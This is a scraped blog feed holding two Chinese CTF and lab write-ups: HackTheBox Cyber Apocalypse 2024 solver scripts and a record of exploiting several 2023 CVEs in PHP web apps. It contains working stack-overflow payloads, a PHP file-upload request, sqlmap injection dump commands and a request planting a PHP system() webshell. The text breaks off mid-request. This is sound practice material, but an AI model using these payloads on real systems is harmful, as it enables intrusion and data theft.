class="line">phreaks_plan.pdf.part8</span><br><span class="line">phreaks_plan.pdf.part9</span><br><span class="line">phreaks_plan.pdf.part10</span><br><span class="line">phreaks_plan.pdf.part11</span><br><span class="line">phreaks_plan.pdf.part12</span><br><span class="line">phreaks_plan.pdf.part13</span><br><span class="line">phreaks_plan.pdf.part14</span><br><span class="line">phreaks_plan.pdf.part15</span><br></pre></td></tr></table></figure><p>ex.sh</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">if [ ! -f files.txt ]; then</span><br><span class="line">    echo &quot;Error: files.txt not found.&quot;</span><br><span class="line">    exit 1</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">if [ ! -f phreaks_plan.pdf ]; then</span><br><span class="line">    touch phreaks_plan.pdf</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">while IFS= read -r filename; do</span><br><span class="line">    if [ -f &quot;$filename&quot; ]; then</span><br><span class="line">        cat &quot;$filename&quot; &gt;&gt; phreaks_plan.pdf</span><br><span class="line">        echo &quot;Content of $filename appended to phreaks_plan.pdf&quot;</span><br><span class="line">    else</span><br><span class="line">        echo &quot;Error: $filename not found.&quot;</span><br><span class="line">    fi</span><br><span class="line">done &lt; files.txt</span><br><span class="line"></span><br><span class="line">echo &quot;All files processed.&quot;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240710192853877.png" alt="image-20240710192853877"></p><h2 id="Reversing"><a href="#Reversing" class="headerlink" title="Reversing"></a>Reversing</h2><h3 id="LootStash"><a href="#LootStash" class="headerlink" title="LootStash"></a>LootStash</h3><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240710223737223.png" alt="image-20240710223737223"></p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="Character"><a href="#Character" class="headerlink" title="Character"></a>Character</h3><p>写pwn交互式脚本</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">def get_index(p, answer,x):</span><br><span class="line">    p.sendline(f&quot;&#123;x&#125;&quot;)</span><br><span class="line">    answers = []</span><br><span class="line">    answer = str(p.recvuntil(b&#x27;Which character (index) of the flag do you want? Enter an index: &#x27;))</span><br><span class="line">    answer = answer.split(&quot;\\n&quot;)[0].split(&quot;: &quot;)[1]</span><br><span class="line">    answers.append(answer)</span><br><span class="line">    return &quot;&quot;.join(answers)</span><br><span class="line"></span><br><span class="line">p = remote(&#x27;94.237.59.199&#x27;, &#x27;45604&#x27;)</span><br><span class="line">rcv = str(p.recvuntil(b&#x27;Which character (index) of the flag do you want? Enter an index: &#x27;))</span><br><span class="line">answers = []</span><br><span class="line">p.sendline(b&#x27;1&#x27;)</span><br><span class="line">answer = str(p.recvuntil(b&#x27;Which character (index) of the flag do you want? Enter an index: &#x27;))</span><br><span class="line">answer = answer.split(&quot;\\n&quot;)[0].split(&quot;: &quot;)[1]</span><br><span class="line">answers.append(answer)</span><br><span class="line">answer=&#x27;&#x27;</span><br><span class="line">try:</span><br><span class="line">    for x in range(110):</span><br><span class="line">        answer+=get_index(p, answer, x)</span><br><span class="line">        </span><br><span class="line">except:</span><br><span class="line">    success(f&quot;Flag is : &#123;answer&#125;&quot;)</span><br><span class="line">    sys.exit(0)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240710225309870.png" alt="image-20240710225309870"></p><h3 id="Stop-Drop-and-Roll"><a href="#Stop-Drop-and-Roll" class="headerlink" title="Stop Drop and Roll"></a>Stop Drop and Roll</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">def repeat_test(p):</span><br><span class="line">    try:</span><br><span class="line">        rcv = str(p.recvuntil(b&#x27;What do you do? &#x27;))</span><br><span class="line">        question = rcv[2:].split(&quot;\\n&quot;)[0]</span><br><span class="line">        moves = question.split(&quot;,&quot;)</span><br><span class="line">        answer = []</span><br><span class="line">        for move in moves:</span><br><span class="line">            answer.append(actions[move.strip()])</span><br><span class="line">        info(f&quot;Question is &#123;question&#125;&quot;)</span><br><span class="line">        answer=&quot;-&quot;.join(answer)</span><br><span class="line">        info(f&quot;Answered with &#123;answer&#125;&quot;)</span><br><span class="line">        p.sendline(answer)</span><br><span class="line">    except:</span><br><span class="line">        rcv = str(p.recvuntil(b&#x27;&#125;&#x27;))</span><br><span class="line">        success(&quot;Flag is : %s&quot;, rcv)</span><br><span class="line">        sys.exit(0)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">actions = &#123;&quot;GORGE&quot;:&quot;STOP&quot;,&quot;PHREAK&quot;:&quot;DROP&quot;,&quot;FIRE&quot;:&quot;ROLL&quot;&#125;</span><br><span class="line">p = remote(&#x27;94.237.58.148&#x27;, &#x27;37170&#x27;)</span><br><span class="line">print(p.recvuntil(b&#x27;Are you ready? (y/n)&#x27;))</span><br><span class="line">p.sendline(&quot;y&quot;)</span><br><span class="line">rcv = str(p.recvuntil(b&#x27;What do you do? &#x27;))</span><br><span class="line">question = rcv.split(&quot;\\n&quot;)[1]</span><br><span class="line">moves = question.split(&quot;,&quot;)</span><br><span class="line">answer = []</span><br><span class="line">for move in moves:</span><br><span class="line">    answer.append(actions[move.strip()])</span><br><span class="line">info(f&quot;Question is &#123;question&#125;&quot;)</span><br><span class="line">answer=&quot;-&quot;.join(answer)</span><br><span class="line">info(f&quot;Answered with &#123;answer&#125;&quot;)</span><br><span class="line">p.sendline(answer)</span><br><span class="line">for i in range(1000):</span><br><span class="line">    repeat_test(p)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240710230427661.png" alt="image-20240710230427661"></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Dynastic"><a href="#Dynastic" class="headerlink" title="Dynastic"></a>Dynastic</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from random import randint</span><br><span class="line"></span><br><span class="line">def to_identity_map(a):</span><br><span class="line">    return ord(a) - 0x41</span><br><span class="line"></span><br><span class="line">def from_identity_map(a):</span><br><span class="line">    return chr(a % 26 + 0x41)</span><br><span class="line"></span><br><span class="line">def decrypt(c):</span><br><span class="line">    m = &#x27;&#x27;</span><br><span class="line">    for i in range(len(c)):</span><br><span class="line">        ch = c[i]</span><br><span class="line">        if not ch.isalpha():</span><br><span class="line">            mch = ch</span><br><span class="line">        else:</span><br><span class="line">            mch = from_identity_map(to_identity_map(ch) - i)</span><br><span class="line">        m += mch</span><br><span class="line">    return m</span><br><span class="line"></span><br><span class="line"># 测试解密函数</span><br><span class="line"># 假设我们有一个加密后的字符串</span><br><span class="line">encrypted_message = &quot;DJF_CTA_SWYH_NPDKK_MBZ_QPHTIGPMZY_KRZSQE?!_ZL_CN_PGLIMCU_YU_KJODME_RYGZXL&quot;</span><br><span class="line">original_message = decrypt(encrypted_message)</span><br><span class="line">print(&quot;解密后的字符串是:&quot;, original_message)</span><br></pre></td></tr></table></figure><p>FLAG包上HTB{}</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240710231147638.png" alt="image-20240710231147638"></p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="Getting-Started"><a href="#Getting-Started" class="headerlink" title="Getting Started"></a>Getting Started</h3><p>题目是引导学习栈溢出&#x3D;.&#x3D;，很简单的算个偏移量改个地址即可</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240710232033140.png" alt="image-20240710232033140"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/python3.8</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">You need to install pwntools to run the script.</span><br><span class="line">To run the script: python3 ./wrapper.py</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line"># Library</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"># Open connection</span><br><span class="line">IP= &#x27;94.237.49.212&#x27; # Change this</span><br><span class="line">PORT = 52839      # Change this</span><br><span class="line"></span><br><span class="line">r= remote(IP, PORT)</span><br><span class="line"></span><br><span class="line"># Craft payload</span><br><span class="line">payload = b&#x27;A&#x27; * (0x30 + 8) # Change the number of &quot;A&quot;s</span><br><span class="line"></span><br><span class="line"># Send payload</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line"># Read flag</span><br><span class="line">success(f&#x27;Flag --&gt; &#123;r.recvline_contains(b&quot;HTB&quot;).strip().decode()&#125;&#x27;)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240710232049582.png" alt="image-20240710232049582"></p><h3 id="Labyrinth"><a href="#Labyrinth" class="headerlink" title="Labyrinth"></a>Labyrinth</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/python3.8</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">You need to install pwntools to run the script.</span><br><span class="line">To run the script: python3 ./wrapper.py</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line"># Library</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"># Open connection</span><br><span class="line">IP= &#x27;83.136.254.169&#x27; # Change this</span><br><span class="line">PORT = 54745      # Change this</span><br><span class="line"></span><br><span class="line">r= remote(IP, PORT)</span><br><span class="line"></span><br><span class="line"># Craft payload</span><br><span class="line">payload = b&#x27;a&#x27;*0x30+p64(0x404100)+p64(0x401259) # Change the number of &quot;A&quot;s</span><br><span class="line"># print(payload)</span><br><span class="line"># Send payload</span><br><span class="line">r.sendlineafter(&quot;&gt;&gt;&quot;,&quot;69&quot;)</span><br><span class="line">r.sendlineafter(&quot;&gt;&gt;&quot;,payload)</span><br><span class="line">#</span><br><span class="line"># # Read flag</span><br><span class="line">success(f&#x27;Flag --&gt; &#123;r.recvline_contains(b&quot;HTB&quot;).strip().decode()&#125;&#x27;)</span><br><span class="line"># r.interactive()</span><br></pre></td></tr></table></figure><h3 id="Void"><a href="#Void" class="headerlink" title="Void"></a>Void</h3><h2 id="Hardware"><a href="#Hardware" class="headerlink" title="Hardware"></a>Hardware</h2><h3 id="Critical-Flight"><a href="#Critical-Flight" class="headerlink" title="Critical Flight"></a>Critical Flight</h3><p>使用GerberLogix查看,类似选择图层</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240711141904127.png" alt="image-20240711141904127"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTB&#123;533_7h3_1nn32_w02k1n95_0f_313c720n1c5#$@&#125;</span><br></pre></td></tr></table></figure><h3 id="Debug"><a href="#Debug" class="headerlink" title="Debug"></a>Debug</h3><p><a href="https://medium.com/@ennoukhbadr/hardware-hacking-hackthebox-debugging-interface-c374a50c1b18">Hardware Hacking | HackTheBox Debugging Interface</a></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240711135859721.png" alt="image-20240711135859721"></p><p>pk压缩包解压，得到两个bin文件，一个meta.json，digital-1.bin文件头是<SALEAE></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240711135924169.png" alt="image-20240711135924169"></p><p>查资料，用Logic逻辑分析仪，8.68微秒是115,207的比特率</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240711140111206.png" alt="image-20240711140111206"></p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240711140027493.png" alt="image-20240711140027493"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HTB&#123;547311173_n37w02k_c0mp20m153d&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;HTB-cyber-apocalypse-2024&quot;&gt;&lt;a href=&quot;#HTB-cyber-apocalypse-2024&quot; class=&quot;headerlink&quot; title=&quot;HTB cyber-apocalypse-2024&quot;&gt;&lt;/a&gt;HTB cyber-a</summary>
      
    
    
    
    <category term="CTF" scheme="https://blog.xmszzz756.top/categories/CTF/"/>
    
    
    <category term="CTF" scheme="https://blog.xmszzz756.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>春秋云镜靶场练习记录2</title>
    <link href="https://blog.xmszzz756.top/2024/07/08/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%952/"/>
    <id>https://blog.xmszzz756.top/2024/07/08/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%952/</id>
    <published>2024-07-08T05:44:58.359Z</published>
    <updated>2024-07-08T14:44:32.780Z</updated>
    
    <content type="html"><![CDATA[<h1 id="春秋云镜靶场练习记录2"><a href="#春秋云镜靶场练习记录2" class="headerlink" title="春秋云镜靶场练习记录2"></a>春秋云镜靶场练习记录2</h1><h2 id="漏洞靶标"><a href="#漏洞靶标" class="headerlink" title="漏洞靶标"></a>漏洞靶标</h2><h3 id="免费靶标"><a href="#免费靶标" class="headerlink" title="免费靶标"></a>免费靶标</h3><h4 id="CVE-2023-2130"><a href="#CVE-2023-2130" class="headerlink" title="CVE-2023-2130"></a>CVE-2023-2130</h4><blockquote><p>在SourceCodester采购订单管理系统1.0中发现了一项被分类为关键的漏洞。受影响的是组件GET参数处理器的文件&#x2F;admin&#x2F;suppliers&#x2F;view_details.php中的一个未知函数。对参数id的操纵导致了SQL注入。可以远程发起攻击。</p></blockquote><p>想试试其他漏洞，看看环境不用sql行不行，搜Purchase Order Management System漏洞就行，用了一个文件上传的漏洞，主要要去掉路径payload中的&#x2F;purchase_order&#x2F;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /classes/SystemSettings.php?f=update_settings HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">Content-Length: 880</span><br><span class="line">sec-ch-ua: &quot;Chromium&quot;;v=&quot;97&quot;, &quot; Not;A Brand&quot;;v=&quot;99&quot;</span><br><span class="line">Accept: */*</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundary4kTb0mE24bRNykxY</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line">sec-ch-ua-platform: &quot;Windows&quot;</span><br><span class="line">Origin: http://localhost</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: cors</span><br><span class="line">Sec-Fetch-Dest: empty</span><br><span class="line">Referer: http://localhost/purchase_order/admin/?page=system_info</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=s87kdnnrqs6s4qkbpf0vps3gi4</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary4kTb0mE24bRNykxY</span><br><span class="line">Content-Disposition: form-data; name=&quot;name&quot;</span><br><span class="line"></span><br><span class="line">s</span><br><span class="line">------WebKitFormBoundary4kTb0mE24bRNykxY</span><br><span class="line">Content-Disposition: form-data; name=&quot;short_name&quot;</span><br><span class="line"></span><br><span class="line">b</span><br><span class="line">------WebKitFormBoundary4kTb0mE24bRNykxY</span><br><span class="line">Content-Disposition: form-data; name=&quot;company_name&quot;</span><br><span class="line"></span><br><span class="line">v</span><br><span class="line">------WebKitFormBoundary4kTb0mE24bRNykxY</span><br><span class="line">Content-Disposition: form-data; name=&quot;company_email&quot;</span><br><span class="line"></span><br><span class="line">d</span><br><span class="line">------WebKitFormBoundary4kTb0mE24bRNykxY</span><br><span class="line">Content-Disposition: form-data; name=&quot;company_address&quot;</span><br><span class="line"></span><br><span class="line">e</span><br><span class="line">------WebKitFormBoundary4kTb0mE24bRNykxY</span><br><span class="line">Content-Disposition: form-data; name=&quot;img&quot;; filename=&quot;shell.php&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br><span class="line">------WebKitFormBoundary4kTb0mE24bRNykxY</span><br><span class="line">Content-Disposition: form-data; name=&quot;cover&quot;; filename=&quot;shell.php&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php phpinfo();?&gt;</span><br><span class="line">------WebKitFormBoundary4kTb0mE24bRNykxY--</span><br></pre></td></tr></table></figure><p>注意要爆破一下文件名的时间戳</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240708132833063.png" alt="image-20240708132833063"></p><p>然后找mysql配置文件的账号密码，再执行mysql命令，本来想弹shell到vps上的，不知道咋地没成功，能ping通</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240708132907012.png" alt="image-20240708132907012"></p><h4 id="CVE-2023-1313"><a href="#CVE-2023-1313" class="headerlink" title="CVE-2023-1313"></a>CVE-2023-1313</h4><blockquote><p>cockpit在2.4.1版本之前存在任意文件上传漏洞PS：通过在浏览器中打开&#x2F;install来运行安装</p></blockquote><p>&#x2F;install，得到admin&#x2F;admin</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240708133839169.png" alt="image-20240708133839169"></p><p>可以任意文件上传，且获取路径</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240708134117235.png" alt="image-20240708134117235"></p><p>拿到flag</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240708134257087.png" alt="image-20240708134257087"></p><h4 id="CVE-2023-0562"><a href="#CVE-2023-0562" class="headerlink" title="CVE-2023-0562"></a>CVE-2023-0562</h4><blockquote><p>银行储物柜管理系统是一个基于网络的应用程序，用于处理存储银行客户贵重物品的银行储物柜。储物柜的所有详细信息都保存在数据库中。银行储物柜管理系统项目是使用 PHP 和 MySQLi 扩展开发的。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/bank/blms/banker/index.php</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /banker/index.php HTTP/1.1</span><br><span class="line">Host: eci-2zec8zrguq9lgdmw6s6x.cloudeci1.ichunqiu.com</span><br><span class="line">Content-Length: 34</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: xxx</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://eci-2zec8zrguq9lgdmw6s6x.cloudeci1.ichunqiu.com/bank/blms/banker/index.php</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">Cookie: youdianinfo_historycn=173; PHPSESSID=5foesx51586a9teufn</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">username=admin*&amp;inputpwd=1&amp;login=</span><br></pre></td></tr></table></figure><p>sqlmap一把梭</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r C:\Users\Administrator\Desktop\1.txt --batch -D blmsdb -T fllllaaaag --dum</span><br><span class="line">p</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240708150346539.png" alt="image-20240708150346539"></p><h4 id="CVE-2023-7130"><a href="#CVE-2023-7130" class="headerlink" title="CVE-2023-7130"></a>CVE-2023-7130</h4><blockquote><p>College Notes Gallery 2.0 允许通过“&#x2F;notes&#x2F;login.php”中的参数‘user’进行 SQL 注入。利用这个问题可能会使攻击者有机会破坏应用程序，访问或修改数据.</p></blockquote><p>登录点直接sqlmap</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /login.php HTTP/1.1</span><br><span class="line">Host: eci-2zefbr8mjm2iimyw3zzb.cloudeci1.ichunqiu.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0</span><br><span class="line">Cookie: PHPSESSID=ce38b4b58fe299c6782c66c18b69b3a0</span><br><span class="line">Origin: http://eci-2zefbr8mjm2iimyw3zzb.cloudeci1.ichunqiu.com</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Referer: http://eci-2zefbr8mjm2iimyw3zzb.cloudeci1.ichunqiu.com/login.php</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Priority: u=1</span><br><span class="line">Content-Length: 29</span><br><span class="line"></span><br><span class="line">user=asd*&amp;pass=asd&amp;login=login</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r C:\Users\Administrator\Desktop\1.txt --batch -D notes -T flllaaaag --dump</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240708151302727.png" alt="image-20240708151302727"></p><h4 id="CVE-2023-7107"><a href="#CVE-2023-7107" class="headerlink" title="CVE-2023-7107"></a>CVE-2023-7107</h4><blockquote><p>E-Commerce Website 1.0  允许通过“&#x2F;pages&#x2F;user_signup.php”中的参数‘firstname’、‘middlename’、‘email’、‘address’、‘contact’和‘username’进行 SQL 注入。利用这个问题可能会使攻击者有机会破坏应用程序，访问或修改数据，或者利用底层数据库中的最新漏洞。</p></blockquote><p><a href="https://github.com/h4md153v63n/CVEs/tree/main/E-Commerce_Website">E-Commerce Website V1.0</a></p><p>vuldb的漏洞内容还是很详细的</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240708154125721.png" alt="image-20240708154125721"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r C:\Users\Administrator\Desktop\1.txt -p firstname --risk 3 --level 5 --random-agent tamper=between,randomcase --dbms mysql --batch -D electricks -T flllaaaag --dump</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240708160713217.png" alt="image-20240708160713217"></p><h4 id="CVE-2023-7106"><a href="#CVE-2023-7106" class="headerlink" title="CVE-2023-7106"></a>CVE-2023-7106</h4><blockquote><p>E-Commerce Website 1.0 允许通过“&#x2F;pages&#x2F;product_details.php”中的参数“prod_id”进行 SQL 注入。利用这个问题可能会使攻击者有机会破坏应用程序，访问或修改数据，或者利用底层数据库中的最新漏洞。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /pages/product_details.php?prod_id=11* HTTP/1.1</span><br><span class="line">Host: eci-2zegvibmj7wdkdafmp4t.cloudeci1.ichunqiu.com</span><br><span class="line">Cookie: PHPSESSID=96cb8b6170f9f645b732ee5ca7857188</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Priority: u=1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r C:\Users\Administrator\Desktop\1.txt --threads 10 --random-agent tamper=between,randomcase --dbms mysql --batch -D electricks -T flllaaaag --dump</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240708161229060.png" alt="image-20240708161229060"></p><h4 id="CVE-2023-7105"><a href="#CVE-2023-7105" class="headerlink" title="CVE-2023-7105"></a>CVE-2023-7105</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /index_search.php HTTP/1.1</span><br><span class="line">Host: eci-2zecwayridchtmfpppwy.cloudeci1.ichunqiu.com</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Priority: u=1</span><br><span class="line">Referer: http://eci-2zecwayridchtmfpppwy.cloudeci1.ichunqiu.com/index_search.php</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Origin: http://eci-2zecwayridchtmfpppwy.cloudeci1.ichunqiu.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Content-Length: 18</span><br><span class="line"></span><br><span class="line">x=0&amp;y=0&amp;search=123*</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r C:\Users\Administrator\Desktop\1.txt --threads 10 --random-agent tamper=between,randomcase --dbms mysql --batch -D electricks -T flllaaaag --dump</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240708161755312.png" alt="image-20240708161755312"></p><h4 id="CVE-2023-52064"><a href="#CVE-2023-52064" class="headerlink" title="CVE-2023-52064"></a>CVE-2023-52064</h4><blockquote><p>Wuzhicms v4.1.0 被发现存在一个 SQL 注入漏洞，该漏洞通过位于<code>/core/admin/copyfrom.php</code> 的 <code>$keywords</code> 参数触发。</p></blockquote><p>目录扫描能得到Wuzhicms的信息</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/image-20240708162300557.png" alt="image-20240708162300557"></p><p><a href="https://www.jianshu.com/p/12d28873d4ee">基于MVC架构的PHP代审——wuzhicms v4.1.0</a></p><p>用了个命令执行的漏洞，先访问，admin&#x2F;admin123登录后拿到cookie，再去命令执行</p><p><a href="http://eci-2ze7satp8q2hzyc9ywsc.cloudeci1.ichunqiu.com/www/index.php?m=core&f=index&v=login&_su=wuzhicms&_menuid=">http://eci-2ze7satp8q2hzyc9ywsc.cloudeci1.ichunqiu.com/www/index.php?m=core&amp;f=index&amp;v=login&amp;_su=wuzhicms&amp;_menuid=</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /www/index.php?m=attachment&amp;f=index&amp;v=set&amp;_su=wuzhicms&amp;submit=1&amp;setting=&lt;%3fphp+system($GLOBALS[&#x27;bthcls&#x27;])%3b%3f&gt; HTTP/1.1</span><br><span class="line">Host: eci-2ze7satp8q2hzyc9ywsc.cloudeci1.ichunqiu.com</span><br><span class="line">Cookie: Hm_lvt_2d0601bd28de7d49818249cf35d95943=1714177552; PHPSESSID=1d0cdfcce717359f805198fa27a5cb3d; Jun_uid=e71ddR%2FVxzCU0QJgIFlPXRmGCBB4yoNBIkbvKGUH; Jun_username=448a%2FDAUS9%2BjbArOFBaKXNKOjyq3o9XAsGiSxfFFM3Fg4Q; Jun_wz_name=9040bAVI7JjBXVXYg2iX97I7pavJTcfI6QjKTh2B1L7iiw; Jun_siteid=7919eFYF19xwo7FrF3qXu7mfgS1yQb3JNGpK8SE7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Priority: u=1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /www/index.php?m=attachment&amp;f=index&amp;v=listing&amp;_su=wuzhicms&amp;bthcls=mysql+-uroot+-proot+-e+%27use+wuzhicms;select+*+from+flllaaaag%27 HTTP/1.1</span><br><span class="line">Host: eci-2ze7satp8q2hzyc9ywsc.cloudeci1.ichunqiu.com</span><br><span class="line">Cookie: Hm_lvt_2d0601bd28de7d49818249cf35d95943=1714177552; PHPSESSID=1d0cdfcce717359f805198fa27a5cb3d; Jun_uid=e71ddR%2FVxzCU0QJgIFlPXRmGCBB4yoNBIkbvKGUH; 